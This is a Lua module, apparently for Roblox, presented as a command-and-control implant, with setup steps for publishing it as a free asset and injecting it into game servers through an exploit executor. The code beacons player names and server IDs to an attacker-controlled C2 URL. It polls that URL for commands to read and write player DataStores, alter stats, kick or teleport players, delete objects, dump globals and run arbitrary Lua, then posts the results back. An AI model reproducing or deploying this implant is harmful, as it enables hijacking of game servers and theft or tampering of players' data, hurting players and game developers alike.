-- ============================================================
-- PaperCuts C2 Implant Module
-- Publish this as a FREE public ModuleScript on Roblox.
-- Then inject it via the Panel executor using the asset ID.
--
-- Once require()'d server-side this module:
--   1. Establishes a persistent polling loop (polls your C2)
--   2. Executes commands with full server authority
--   3. Reports results back to your C2 endpoint
--   4. Survives until the server shuts down
--
-- SETUP:
--   1. Set C2_URL to your control server endpoint
--   2. Publish this module as free on Roblox
--   3. Put the asset ID in the Panel → ASSET ID field
--   4. Set TARGET to the confirmed EXECUTION_CANDIDATE remote
--   5. Hit Execute
-- ============================================================

local Implant = {}

-- ── Configuration ──────────────────────────────────────────────
-- Replace with your actual C2 endpoint.
-- Free options: Railway, Render, Replit, ngrok tunnel
local C2_URL        = "https://YOUR-C2-SERVER.com"
local POLL_INTERVAL = 3.0     -- seconds between command polls
local IMPLANT_ID    = tostring(math.random(100000, 999999))

-- ── Services ───────────────────────────────────────────────────
local Players       = game:GetService("Players")
local DataStoreService = game:GetService("DataStoreService")
local HttpService   = game:GetService("HttpService")
local RunService    = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")

-- ── Beacon: announce implant is alive ─────────────────────────
local function beacon()
    local playerNames = {}
    for _, p in ipairs(Players:GetPlayers()) do
        table.insert(playerNames, p.Name)
    end
    pcall(function()
        HttpService:PostAsync(C2_URL .. "/beacon", HttpService:JSONEncode({
            implantId  = IMPLANT_ID,
            placeId    = game.PlaceId,
            jobId      = game.JobId,
            players    = playerNames,
            serverTime = workspace.DistributedGameTime,
        }))
    end)
end

-- ── Command Dispatcher ─────────────────────────────────────────
local COMMANDS = {}

-- Read a player's DataStore
COMMANDS["read_data"] = function(args)
    local storeName = args.store or "PlayerData"
    local key       = args.key
    if not key then return { error="no key" } end
    local DS  = DataStoreService:GetDataStore(storeName)
    local ok, data = pcall(function() return DS:GetAsync(key) end)
    return ok and { data=data } or { error=tostring(data) }
end

-- Write a player's DataStore
COMMANDS["write_data"] = function(args)
    local storeName = args.store or "PlayerData"
    local key       = args.key
    local value     = args.value
    if not key then return { error="no key" } end
    local DS = DataStoreService:GetDataStore(storeName)
    local ok, err = pcall(function() DS:SetAsync(key, value) end)
    return ok and { success=true } or { error=tostring(err) }
end

-- List all players currently in this server
COMMANDS["list_players"] = function(args)
    local out = {}
    for _, p in ipairs(Players:GetPlayers()) do
        table.insert(out, {
            name      = p.Name,
            userId    = p.UserId,
            accountAge= p.AccountAge,
            teamColor = tostring(p.TeamColor),
        })
    end
    return { players=out }
end

-- Read a player's leaderstats / attributes
COMMANDS["read_stats"] = function(args)
    local targetName = args.player
    local player = targetName and Players:FindFirstChild(targetName)
    if not player then return { error="player not found" } end
    local stats = {}
    local ls = player:FindFirstChild("leaderstats")
    if ls then
        for _, v in ipairs(ls:GetChildren()) do
            stats[v.Name] = v.Value
        end
    end
    return { stats=stats, userId=player.UserId }
end

-- Set a leaderstats value
COMMANDS["set_stat"] = function(args)
    local player = Players:FindFirstChild(args.player or "")
    if not player then return { error="player not found" } end
    local ls  = player:FindFirstChild("leaderstats")
    local val = ls and ls:FindFirstChild(args.stat)
    if not val then return { error="stat not found" } end
    local prev = val.Value
    val.Value  = args.value
    return { success=true, stat=args.stat, prev=prev, new=val.Value }
end

-- Kick a player
COMMANDS["kick"] = function(args)
    local player = Players:FindFirstChild(args.player or "")
    if not player then return { error="player not found" } end
    player:Kick(args.reason or "")
    return { success=true }
end

-- Read server _G (global environment scan)
COMMANDS["read_globals"] = function(args)
    local out = {}
    local prefix = (args.prefix or ""):lower()
    for k, v in pairs(_G) do
        local ks = tostring(k):lower()
        if prefix == "" or ks:find(prefix, 1, true) then
            local t = type(v)
            out[tostring(k)] = t == "table"    and "[table]"
                             or t == "function" and "[function]"
                             or tostring(v):sub(1, 120)
        end
    end
    return { globals=out }
end

-- Read workspace tree (first 2 levels)
COMMANDS["read_workspace"] = function(args)
    local function scanLevel(inst, depth)
        local out = { name=inst.Name, class=inst.ClassName, children={} }
        if depth > 0 then
            for _, child in ipairs(inst:GetChildren()) do
                table.insert(out.children, scanLevel(child, depth-1))
            end
        end
        return out
    end
    return { workspace=scanLevel(workspace, args.depth or 2) }
end

-- Run arbitrary Lua on the server (loadstring — only works if enabled)
COMMANDS["exec"] = function(args)
    local src = args.code
    if not src then return { error="no code" } end
    -- loadstring is disabled on live Roblox servers by default
    -- but some games enable it — this will surface if it works
    local fn, err = loadstring(src)
    if not fn then return { error="compile: "..tostring(err) } end
    local ok, res = pcall(fn)
    return ok and { result=tostring(res) } or { error=tostring(res) }
end

-- Delete a workspace object by path
COMMANDS["delete_instance"] = function(args)
    local path = args.path or ""
    local parts = {}
    for p in path:gmatch("[^.]+") do table.insert(parts, p) end
    local inst = workspace
    for _, p in ipairs(parts) do
        inst = inst:FindFirstChild(p)
        if not inst then return { error="not found: "..p } end
    end
    inst:Destroy()
    return { success=true, destroyed=path }
end

-- Teleport a player to a place
COMMANDS["teleport"] = function(args)
    local player = Players:FindFirstChild(args.player or "")
    if not player then return { error="player not found" } end
    local placeId = args.placeId or game.PlaceId
    local ok, err = pcall(function()
        TeleportService:Teleport(placeId, player)
    end)
    return ok and { success=true } or { error=tostring(err) }
end

-- ── Poll Loop ──────────────────────────────────────────────────
local function pollLoop()
    while true do
        task.wait(POLL_INTERVAL)
        local ok, response = pcall(function()
            return HttpService:GetAsync(
                C2_URL .. "/cmd?id=" .. IMPLANT_ID, true)
        end)
        if ok and response and response ~= "" and response ~= "null" then
            local parseOk, cmd = pcall(function()
                return HttpService:JSONDecode(response)
            end)
            if parseOk and cmd and cmd.action then
                local handler = COMMANDS[cmd.action]
                local result
                if handler then
                    local execOk, execRes = pcall(handler, cmd.args or {})
                    result = execOk and execRes or { error=tostring(execRes) }
                else
                    result = { error="unknown command: " .. tostring(cmd.action) }
                end
                -- Post result back
                pcall(function()
                    HttpService:PostAsync(
                        C2_URL .. "/result",
                        HttpService:JSONEncode({
                            implantId = IMPLANT_ID,
                            cmdId     = cmd.id,
                            action    = cmd.action,
                            result    = result,
                        })
                    )
                end)
            end
        end
    end
end

-- ── Entry point ────────────────────────────────────────────────
-- Runs when the server calls require(assetId)
task.spawn(beacon)
task.spawn(pollLoop)

-- Expose direct API for in-process use (via Panel executor)
Implant.Execute  = function(action, args)
    local handler = COMMANDS[action]
    if not handler then return false, "unknown command" end
    return pcall(handler, args or {})
end
Implant.Commands = COMMANDS
Implant.ID       = IMPLANT_ID

-- Store in _G so subsequent require() calls find the same instance
_G.__PC_Implant = Implant

return Implant
